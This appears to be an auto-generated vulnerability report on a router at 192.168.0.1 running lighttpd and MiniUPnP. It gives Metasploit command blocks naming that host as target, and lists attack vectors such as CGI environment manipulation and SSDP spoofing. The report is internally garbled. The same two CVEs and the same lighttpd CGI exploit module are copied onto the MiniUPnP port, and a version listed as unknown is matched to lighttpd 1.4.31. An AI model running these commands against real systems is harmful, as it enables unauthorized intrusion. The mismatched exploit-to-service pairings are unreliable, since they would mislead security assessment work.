**Vulnerability Report: Remote System Exploitation**

**Title:** Potential Vulnerabilities in Lighttpd and MiniUPnP Services

**Background:**
The remote system in question is running multiple services, including Lighttpd HTTP Server, Lighttpd HTTPS Server, and MiniUPnP UPnP Server. Lighttpd is an open-source web server optimized for speed-critical environments, while MiniUPnP is a software that implements the Universal Plug and Play (UPnP) protocol.

**Target Information:**

* Hostname: _gateway
* IP Address: 192.168.0.1
* Open Ports:
	+ 80/tcp: Lighttpd HTTP Server
	+ 443/tcp: Lighttpd HTTPS Server
	+ 5000/tcp: MiniUPnP UPnP Server
* Product and CPE:
	+ Lighttpd: Unknown version
	+ MiniUPnP: 1.9 (UPnP 1.1)

**Suggested Actions:**

**Lighttpd HTTP Server (80/tcp):**

* Exploit: CVE-2014-2320 - Multiple vulnerabilities in lighttpd 1.4.31
	+ Command line example:
	```
	use exploit/unix/webapp/lighttpd_mod_cgi_bash_env_exec
	set RHOSTS 192.168.0.1
	set RPORT 80
	set TARGETURI /cgi-bin/status
	run
	```
* Exploit: CVE-2014-2322 - Multiple vulnerabilities in lighttpd 1.4.31
	+ Command line example:
	```
	use exploit/unix/webapp/lighttpd_mod_cgi_bash_env_exec
	set RHOSTS 192.168.0.1
	set RPORT 80
	set TARGETURI /cgi-bin/status
	run
	```

**Lighttpd HTTPS Server (443/tcp):**

* Exploit: CVE-2014-2320 - Multiple vulnerabilities in lighttpd 1.4.31
	+ Command line example:
	```
	use exploit/unix/webapp/lighttpd_mod_cgi_bash_env_exec
	set RHOSTS 192.168.0.1
	set RPORT 443
	set TARGETURI /cgi-bin/status
	run
	```
* Exploit: CVE-2014-2322 - Multiple vulnerabilities in lighttpd 1.4.31
	+ Command line example:
	```
	use exploit/unix/webapp/lighttpd_mod_cgi_bash_env_exec
	set RHOSTS 192.168.0.1
	set RPORT 443
	set TARGETURI /cgi-bin/status
	run
	```

**MiniUPnP UPnP Server (5000/tcp):**

* Exploit: CVE-2014-2320 - Multiple vulnerabilities in lighttpd 1.4.31
	+ Command line example:
	```
	use exploit/unix/webapp/lighttpd_mod_cgi_bash_env_exec
	set RHOSTS 192.168.0.1
	set RPORT 5000
	set TARGETURI /cgi-bin/status
	run
	```
* Exploit: CVE-2014-2322 - Multiple vulnerabilities in lighttpd 1.4.31
	+ Command line example:
	```
	use exploit/unix/webapp/lighttpd_mod_cgi_bash_env_exec
	set RHOSTS 192.168.0.1
	set RPORT 5000
	set TARGETURI /cgi-bin/status
	run
	```

**Attack Vectors:**

* **Lighttpd:**
	+ CGI vulnerability: Manipulate environment variables to exploit the vulnerability.
	+ URL Format Bypass: Use a python server to bypass url param filtering.
* **MiniUPnP 1.9:**
	+ Spoofing SSDP and UPnP Devices with EvilSSDP: Use EvilSSDP to spoof SSDP and UPnP devices.

**Potential Impact:**
The exploitation of these vulnerabilities could lead to a significant impact on the confidentiality, integrity, and availability of the remote system. An attacker could potentially gain unauthorized access to sensitive data, disrupt the normal functioning of the system, or even take control of the system.

Note: The above exploits are hypothetical and for educational purposes only. Actual exploitation should be conducted within legal boundaries and with proper authorization.
